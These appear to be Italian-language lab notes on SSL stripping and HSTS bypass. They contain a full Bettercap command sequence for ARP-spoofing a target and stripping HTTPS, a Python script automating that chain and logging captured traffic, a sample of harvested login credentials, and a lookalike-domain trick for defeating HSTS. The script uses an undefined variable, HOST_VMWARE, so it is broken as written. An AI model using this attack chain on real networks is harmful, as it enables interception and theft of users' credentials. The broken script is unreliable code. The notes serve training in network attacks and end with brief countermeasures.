Lab-02— SSL Stripping & HSTS Bypass with Bettercap

| Concetto | Descrizione |
|---|---|
| SSL Stripping | Downgrade HTTPS → HTTP tra victim e attaccante, mantenendo HTTPS verso il server |
| HSTS | HTTP Strict Transport Security — header che forza HTTPS nel browser |
| HSTS Hijack | Bypass HSTS usando domini simili (es. `paypal.com` → `paypaI.com`) |
| Bettercap | Framework MITM avanzato: ARP spoof + proxy + sniff in un unico tool |
| mitmproxy | Proxy intercettazione TLS/HTTP interattivo |

---

#### Attack flow

```
Victim Browser  ←HTTP→  Attacker (Kali)  ←HTTPS→  Real Server
                          │
                     SSL Strip proxy
                     (Bettercap/mitmproxy)
```

#### Bettercap command sequence

```bash
# Lancio base Bettercap
sudo bettercap -iface eth0

# Comandi interattivi (o via -eval):
net.probe on               # scopre host attivi
net.sniff on               # sniffing pacchetti
set arp.spoof.targets 192.168.142.141
set arp.spoof.fullduplex true
arp.spoof on               # avvia MITM via ARP

set https.proxy.sslstrip true
https.proxy on             # proxy HTTPS con SSL strip
hstshijack                 # bypass HSTS
```

#### Script — Bettercap automation (Pasquale's solution)

```python
import subprocess

INTERFACCIA   = "eth0"
TARGET_IP     = "192.168.142.141"
NOME_FILE_LOG = "cattura_dati.log"

comandi = [
    f"set net.sniff.skip {HOST_VMWARE}",
    "events.ignore zeroconf.browsing",
    f"set events.stream.output {NOME_FILE_LOG}",
    "net.probe on",
    "sleep 7",
    "net.probe off",
    f"set arp.spoof.targets {TARGET_IP}",
    "set arp.spoof.fullduplex true",
    "arp.spoof on",
    "set https.proxy.sslstrip true",
    "https.proxy on",
    "hstshijack"
]

stringa_comandi = "; ".join(comandi)
subprocess.run(["sudo", "bettercap", "-iface", INTERFACCIA, "-eval", stringa_comandi])
```

#### Credential capture example

```
# Output Bettercap dopo SSL strip su sito HTTP
[http.proxy] POST http://example.com/login
  username=admin&password=password123
```

#### Countermeasures
- HSTS Preloading (browser hardcoded list)
- Certificate Pinning
- VPN cifrata end-to-end

---
